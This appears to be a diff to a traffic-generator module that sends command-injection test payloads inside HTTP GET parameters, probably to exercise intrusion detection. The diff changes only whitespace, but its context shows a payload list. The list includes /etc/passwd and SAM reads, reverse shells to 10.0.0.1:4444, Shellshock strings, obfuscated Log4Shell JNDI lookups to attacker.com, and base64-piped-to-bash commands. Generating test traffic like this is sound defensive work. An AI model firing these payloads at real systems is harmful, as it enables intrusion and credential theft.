@@ -17,7 +17,6 @@ COMMAND_INJECTION_PAYLOADS = [
     "& cat /etc/passwd",
     "`cat /etc/passwd`",
     "$(cat /etc/passwd)",
-
     # Command substitution
     "; id",
     "| id",
@@ -26,41 +25,34 @@ COMMAND_INJECTION_PAYLOADS = [
     "; uname -a",
     "`id`",
     "$(id)",
-
     # Windows commands
     "& dir",
     "| dir",
     "& type C:\\Windows\\System32\\config\\SAM",
     "| net user",
     "& net localgroup administrators",
-
     # Reverse shell attempts (patterns only)
     "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
     "; nc -e /bin/sh 10.0.0.1 4444",
     "; python -c 'import socket,subprocess,os'",
     "; perl -e 'use Socket'",
-
     # Shellshock (CVE-2014-6271)
     "() { :; }; /bin/bash -c 'cat /etc/passwd'",
     "() { :;}; /bin/bash -c 'id'",
     "() { ignored; }; /bin/bash -c 'whoami'",
-
     # Log4Shell (CVE-2021-44228) patterns
     "${jndi:ldap://attacker.com/a}",
     "${jndi:rmi://attacker.com/a}",
     "${jndi:dns://attacker.com/a}",
     "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.com/a}",
     "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}",
-
     # Newline injection
     "%0a cat /etc/passwd",
     "%0d%0a cat /etc/passwd",
     "\\n cat /etc/passwd",
-
     # Encoded commands
     ";Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash",
     ";echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh",
-
     # Argument injection
     "--help; id",
     "-version; whoami",
@@ -112,6 +104,7 @@ class CommandInjectionModule(TrafficModule):
         self._payload_index += 1
 
         import urllib.parse
+
         encoded_payload = urllib.parse.quote(payload)
 
         # HTTP GET with command injection in parameter
@@ -153,5 +146,3 @@ class CommandInjectionModule(TrafficModule):
         )
 
         yield packet
-
-
